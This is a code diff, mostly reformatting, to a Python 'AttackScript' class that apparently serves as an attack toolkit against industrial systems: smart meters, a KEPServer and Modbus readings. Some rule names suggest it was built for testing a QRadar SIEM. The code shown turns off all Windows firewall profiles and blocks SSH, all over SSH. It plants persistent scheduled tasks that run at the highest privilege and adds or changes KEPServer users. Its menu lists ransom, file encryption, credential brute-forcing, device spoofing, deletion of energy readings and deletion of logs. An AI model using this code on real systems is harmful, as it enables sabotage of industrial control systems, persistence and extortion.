@@ -91,9 +91,11 @@ class AttackScript:
 
         Returns:
             str: The output of the command.
+        
+        NOTE: The output only allows a maximum of 2^21 characters.
         """
 
-        ssh_output: str = ""  # Declare as string to prevent error proning
+        ssh_output: str = "" # Declare as string to prevent error proning
 
         # Create an SSH client
         ssh = paramiko.SSHClient()
@@ -157,12 +159,11 @@ class AttackScript:
         else:
             check_file_exist = self.ssh_run_command(f"dir {self.MODPOLL_PATH}")
 
-            if (path.basename(__file__).rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(
-                    " "):
+            if (path.basename(__file__).rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(" "):
                 # Try to compile to exe if it is windows and the exe doesnt exist yet. If exe alrd exist, just create the task scheduler
                 if platform.system() != "Windows":
-                    raise Exception(
-                        "Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
+                    raise Exception("Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
+                
                 self.transfer_exe_remotely()
 
             executable_file_path = f"{self.MODPOLL_PATH}\\{path.basename(__file__).rsplit('.', 1)[0]}.exe"
@@ -204,7 +205,6 @@ class AttackScript:
             # sch1 = f'schtasks /create /tn "{task_name1}" /tr "cmd /c \"{executable_file_path} {executable_file_parameters}\"" /sc minute /mo 1 /f /rl HIGHEST'
             sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
             sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
-            # TODO: Test if the task scheduler works.
             command_output_1 = self.ssh_run_command(sch1)
             command_output_2 = self.ssh_run_command(sch2)
             print(command_output_1)
@@ -232,8 +232,7 @@ class AttackScript:
             # TODO: Test if the task scheduler works.
             command_output_1 = self.ssh_run_command(sch1)
             command_output_2 = self.ssh_run_command(sch2)
-            print(command_output_1)
-            print(command_output_2)
+            print(command_output_1); print(command_output_2)
             print("\nOk.\n")
         except Exception as e:
             print(e)
@@ -255,12 +254,15 @@ class AttackScript:
     def disable_firewall(self, revert: bool=False) -> None:
         """
         Turn off all three domains of the firewall
+
+        Args:
+            revert (bool): Enables all three domains of the firewall if True
         """
         able = "Disabled"
         if revert:
             able = "Enabled"
             command_output = self.ssh_run_command("netsh advfirewall set allprofiles state on")
-        # cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
+        # cp = run('netsh advfirewall set allprofiles state off', stdout=PIPE, shell=True)
         else:
             command_output = self.ssh_run_command("netsh advfirewall set allprofiles state off")
 
@@ -274,32 +276,28 @@ class AttackScript:
         Disable SSH from the firewall
         """
         count = 0
-        command_output = self.ssh_run_command(
-            'netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
+        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
         if "Ok." in command_output:
             count += 1
             print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
         else:
             print("Inbound Firewall Failed to be Inserted")
 
-        command_output = self.ssh_run_command(
-            'netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
+        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
         if "Ok." in command_output:
             count += 1
             print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
         else:
             print("Inbound Firewall Failed to be Inserted")
 
-        command_output = self.ssh_run_command(
-            'netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
+        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
         if "Ok." in command_output:
             count += 1
             print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
         else:
             print("Outbound Firewall Failed to be Inserted")
 
-        command_output = self.ssh_run_command(
-            'netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
+        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
         if "Ok." in command_output:
             count += 1
             print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
@@ -1232,16 +1230,14 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(admin.users.get_user(server, user), indent=4), file=sys.stdout)
 
-    def kep_modify_user(self, user, description, password,
-                        groupname): 
+    def kep_modify_user(self, user, description, password, groupname): 
         server = self.kep_connect()
         print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": description,
                                                           "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname,
                                                           "libadminsettings.USERMANAGER_USER_PASSWORD": password},
                                                  user=user), indent=4))
 
-    def kep_add_user(self, user, groupname,
-                     password):  
+    def kep_add_user(self, user, groupname, password):  
         server = self.kep_connect()
         print(admin.users.add_user(server, {"common.ALLTYPES_NAME": user,
                                             "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname,
@@ -2009,8 +2005,39 @@ class AttackScript:
             case "31": self.Ransom()
             case "32": self.revert_decrypt()
             case "-h":
-                print(
-                    "\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
+                print("\nChoose \n" +
+                      "1  Delete file, \n" +
+                      "2  Copy file, \n" +
+                      "3  Disable firewall, \n" +
+                      "4  Disable ssh through firewall, \n" +
+                      "5  Disable Kepserver, \n" +
+                      "6  Interrupt modbus reading, \n" +
+                      "7  Disable COMPORT, \n" +
+                      "8  Encrypt files, \n" +
+                      "9  Change Meter25 Id to 26, \n" +
+                      "10 Clear Energy Reading, \n" +
+                      "11 Revert with options, \n" +
+                      "12 Bruteforce KEPServer Password, \n" +
+                      "13 Disable sshd Service, \n" +
+                      "14 Get Smartmeter hardware info, \n" +
+                      "15 Get KEP Server info, \n" + 
+                      "16 Get all KEP Server Users, \n" +
+                      "17 Enable KEP User, \n" +
+                      "18 Disable KEP User, \n" +
+                      "19 Get single KEP User info, \n" +
+                      "20 Disable running schedules, \n" +
+                      "21 Get all KEP Channels, \n" + 
+                      "22 Get all KEP Devices, \n" + 
+                      "23 Get single KEP Device, \n" +
+                      "24 Delete KEP Spoofed Device, \n" +
+                      "25 Add KEP Spoofed Device, \n" +
+                      "26 Bruteforce SSH credentials, \n" +
+                      "27 Setup SSH Configuration and Keys, \n" +
+                      "28 Delete KEP Log Files, \n" +
+                      "29 Get Log Group, \n" +
+                      "30 Encrypt Files, \n" +
+                      "31 Ransom, \n" +
+                      "32 Decrypt Files")       
             case _:
                 print("Invalid Option! Use option \"-h\" for help!")
 
